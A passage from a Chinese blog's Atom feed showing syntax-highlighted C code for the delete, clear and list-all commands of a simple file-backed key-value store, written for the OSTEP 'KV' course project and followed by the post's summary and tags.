punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 条目备份</span><span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 当前条目键值为key，不写入（相当于删除）</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;课程项目&lt;/a&gt; 的 KV 部分，包含个人的代码实现和设计思路。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
